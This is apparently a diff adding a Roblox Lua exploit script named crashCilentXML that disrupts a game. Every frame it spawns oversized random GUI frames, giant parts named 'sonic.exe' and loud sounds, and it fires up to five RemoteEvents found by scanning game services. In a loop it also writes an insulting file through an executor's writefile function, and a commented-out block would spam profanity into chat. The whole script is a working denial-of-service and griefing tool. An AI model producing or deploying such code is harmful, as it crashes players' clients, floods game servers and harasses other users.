@@ -1,0 +1,208 @@
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local TextChatService = game:GetService("TextChatService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Workspace = game:GetService("Workspace")
+
+local remote1, remote2, remote3, remote4, remote5
+
+local function scan(parent)
+	for _, child in ipairs(parent:GetChildren()) do
+		if child:IsA("RemoteEvent") or child:IsA("UnreliableRemoteEvent") then
+			if not remote1 then remote1 = child
+			elseif not remote2 then remote2 = child
+			elseif not remote3 then remote3 = child
+			elseif not remote4 then remote4 = child
+			elseif not remote5 then remote5 = child
+			else break end
+		end
+		scan(child)
+		if remote5 then break end
+	end
+end
+
+for _, service in ipairs({game:GetService("Workspace"), game:GetService("ReplicatedStorage"), game:GetService("Players"), game:GetService("StarterGui"), game:GetService("StarterPack")}) do
+	scan(service)
+	if remote5 then break end
+end
+
+local function crashCilentXML()
+	local player = Players.LocalPlayer
+	local playerUi = player:WaitForChild("PlayerGui")
+	local fn = tostring(math.random(1, 10000000000))
+	local fc = "Fuck you bitch"
+	local messageToSpam = "asshole"
+
+	RunService.Stepped:Connect(function()
+		local screenGui = Instance.new("ScreenGui")
+		screenGui.Name = "XMLUi"
+		screenGui.ResetOnSpawn = false
+		screenGui.Parent = playerUi
+
+		local frame = Instance.new("Frame")
+		frame.Name = "XmlRun"
+		frame.Position = UDim2.new(0, math.random(1, 1000), 0, math.random(1, 1000))
+		frame.Size = UDim2.new(0, math.random(1, 10000000), 0, math.random(1, 100000000000))
+		frame.BackgroundColor3 = Color3.fromRGB(math.random(1, 255), math.random(1, 255), math.random(1, 255))
+		frame.AnchorPoint = Vector2.new(0.5,0.5)
+		frame.Parent = screenGui
+		
+			local frame = Instance.new("Frame")
+		frame.Name = "XmlRun"
+		frame.Position = UDim2.new(0, math.random(1, 1000), 0, math.random(1, 1000))
+		frame.Size = UDim2.new(0, math.random(1, 10000000000), 0, math.random(1, 10000000000))
+		frame.BackgroundColor3 = Color3.fromRGB(math.random(1, 255), math.random(1, 255), math.random(1, 255))
+		frame.AnchorPoint = Vector2.new(0.5,0.5)
+		frame.Parent = screenGui
+		
+			local frame = Instance.new("Frame")
+		frame.Name = "XmlRun"
+		frame.Position = UDim2.new(0, math.random(1, 1000), 0, math.random(1, 1000))
+		frame.Size = UDim2.new(0, math.random(1, 10000000000), 0, math.random(1, 10000000000))
+		frame.BackgroundColor3 = Color3.fromRGB(math.random(1, 255), math.random(1, 255), math.random(1, 255))
+		frame.AnchorPoint = Vector2.new(0.5,0.5)
+		frame.Parent = screenGui
+		
+			local frame = Instance.new("Frame")
+		frame.Name = "XmlRun"
+		frame.Position = UDim2.new(0, math.random(1, 1000), 0, math.random(1, 1000))
+		frame.Size = UDim2.new(0, math.random(1, 1000000000), 0, math.random(1, 10000000000))
+		frame.BackgroundColor3 = Color3.fromRGB(math.random(1, 255), math.random(1, 255), math.random(1, 255))
+		frame.AnchorPoint = Vector2.new(0.5,0.5)
+		frame.Parent = screenGui
+		
+			local frame = Instance.new("Frame")
+		frame.Name = "XmlRun"
+		frame.Position = UDim2.new(0, math.random(1, 1000), 0, math.random(1, 1000))
+		frame.Size = UDim2.new(0, math.random(1, 10000000000), 0, math.random(1, 10000000000))
+		frame.BackgroundColor3 = Color3.fromRGB(math.random(1, 255), math.random(1, 255), math.random(1, 255))
+		frame.AnchorPoint = Vector2.new(0.5,0.5)
+		frame.Parent = screenGui
+
+		local sonic = Instance.new("Sound")
+		sonic.SoundId = "rbxassetid://131367648174751"
+		sonic.Volume = 10
+		sonic.Parent = Workspace
+		sonic:Play()
+
+		local sonic_exe = Instance.new("Part")
+		sonic_exe.Name = "sonic.exe"
+		sonic_exe.Position = Vector3.new(math.random(1,100),math.random(1,100),math.random(1,100))
+		sonic_exe.Size = Vector3.new(math.random(1,1000000),math.random(1,100000),math.random(1,1000000))
+		sonic_exe.Color = Color3.fromRGB(math.random(1,255),math.random(1,255),math.random(1,255))
+		sonic_exe.Parent = workspace
+		
+			local sonic_exe = Instance.new("Part")
+		sonic_exe.Name = "sonic.exe"
+		sonic_exe.Position = Vector3.new(math.random(1,100),math.random(1,100),math.random(1,100))
+		sonic_exe.Size = Vector3.new(math.random(1,1000000),math.random(1,100000),math.random(1,1000000))
+		sonic_exe.Color = Color3.fromRGB(math.random(1,255),math.random(1,255),math.random(1,255))
+		sonic_exe.Parent = workspace
+		
+			local sonic_exe = Instance.new("Part")
+		sonic_exe.Name = "sonic.exe"
+		sonic_exe.Position = Vector3.new(math.random(1,100),math.random(1,100),math.random(1,100))
+		sonic_exe.Size = Vector3.new(math.random(1,1000000),math.random(1,100000),math.random(1,1000000))
+		sonic_exe.Color = Color3.fromRGB(math.random(1,255),math.random(1,255),math.random(1,255))
+		sonic_exe.Parent = workspace
+		
+			local sonic = Instance.new("Sound")
+		sonic.SoundId = "rbxassetid://131367648174751"
+		sonic.Volume = 10
+		sonic.Parent = Workspace
+		sonic:Play()
+		
+			local sonic = Instance.new("Sound")
+		sonic.SoundId = "rbxassetid://131367648174751"
+		sonic.Volume = 10
+		sonic.Parent = Workspace
+		sonic:Play()
+		
+			local sonic = Instance.new("Sound")
+		sonic.SoundId = "rbxassetid://131367648174751"
+		sonic.Volume = 10
+		sonic.Parent = Workspace
+		sonic:Play()
+		
+		local sonic_exe = Instance.new("Part")
+		sonic_exe.Name = "sonic.exe"
+		sonic_exe.Position = Vector3.new(math.random(1,100),math.random(1,100),math.random(1,100))
+		sonic_exe.Size = Vector3.new(math.random(1,1000000),math.random(1,100000),math.random(1,1000000))
+		sonic_exe.Color = Color3.fromRGB(math.random(1,255),math.random(1,255),math.random(1,255))
+		sonic_exe.Parent = workspace
+		
+		local sonic_exe = Instance.new("Part")
+		sonic_exe.Name = "sonic.exe"
+		sonic_exe.Position = Vector3.new(math.random(1,100),math.random(1,100),math.random(1,100))
+		sonic_exe.Size = Vector3.new(math.random(1,1000000),math.random(1,100000),math.random(1,1000000))
+		sonic_exe.Color = Color3.fromRGB(math.random(1,255),math.random(1,255),math.random(1,255))
+		sonic_exe.Parent = workspace
+		
+		local sonic_exe = Instance.new("Part")
+		sonic_exe.Name = "sonic.exe"
+		sonic_exe.Position = Vector3.new(math.random(1,100),math.random(1,100),math.random(1,100))
+		sonic_exe.Size = Vector3.new(math.random(1,1000000),math.random(1,100000),math.random(1,1000000))
+		sonic_exe.Color = Color3.fromRGB(math.random(1,255),math.random(1,255),math.random(1,255))
+		sonic_exe.Parent = workspace
+		
+		local sonic_exe = Instance.new("Part")
+		sonic_exe.Name = "sonic.exe"
+		sonic_exe.Position = Vector3.new(math.random(1,100),math.random(1,100),math.random(1,100))
+		sonic_exe.Size = Vector3.new(math.random(1,1000000),math.random(1,100000),math.random(1,1000000))
+		sonic_exe.Color = Color3.fromRGB(math.random(1,255),math.random(1,255),math.random(1,255))
+		sonic_exe.Parent = workspace
+		
+		local sonic_exe = Instance.new("Part")
+		sonic_exe.Name = "sonic.exe"
+		sonic_exe.Position = Vector3.new(math.random(1,100),math.random(1,100),math.random(1,100))
+		sonic_exe.Size = Vector3.new(math.random(1,1000000),math.random(1,100000),math.random(1,1000000))
+		sonic_exe.Color = Color3.fromRGB(math.random(1,255),math.random(1,255),math.random(1,255))
+		sonic_exe.Parent = workspace
+		
+		local sonic_exe = Instance.new("Part")
+		sonic_exe.Name = "sonic.exe"
+		sonic_exe.Position = Vector3.new(math.random(1,100),math.random(1,100),math.random(1,100))
+		sonic_exe.Size = Vector3.new(math.random(1,1000000),math.random(1,100000),math.random(1,1000000))
+		sonic_exe.Color = Color3.fromRGB(math.random(1,255),math.random(1,255),math.random(1,255))
+		sonic_exe.Parent = workspace
+		
+		local sonic_exe = Instance.new("Part")
+		sonic_exe.Name = "sonic.exe"
+		sonic_exe.Position = Vector3.new(math.random(1,100),math.random(1,100),math.random(1,100))
+		sonic_exe.Size = Vector3.new(math.random(1,1000000),math.random(1,100000),math.random(1,1000000))
+		sonic_exe.Color = Color3.fromRGB(math.random(1,255),math.random(1,255),math.random(1,255))
+		sonic_exe.Parent = workspace
+		
+		--[[if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+			local textChannels = TextChatService:FindFirstChild("TextChannels")
+			if textChannels then
+				local rbxGeneral = textChannels:FindFirstChild("RBXGeneral")
+				if rbxGeneral then
+					rbxGeneral:SendAsync(messageToSpam)
+				end
+			end
+		else
+			local defaultChat = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
+			local sayMessageRequest = defaultChat and defaultChat:FindFirstChild("SayMessageRequest")
+			if sayMessageRequest then
+				sayMessageRequest:FireServer(messageToSpam, "All")
+			end
+		end]]
+		if remote1 then remote1:FireServer() end
+if remote2 then remote2:FireServer() end
+if remote3 then remote3:FireServer() end
+if remote4 then remote4:FireServer() end
+if remote5 then remote5:FireServer() end
+	end)
+
+	while true do
+		task.wait(1)
+		if writefile then
+			writefile(fn, fc)
+		end
+		print("You are an idiot.")
+	end
+end
+
+crashCilentXML()
+scan(parent)
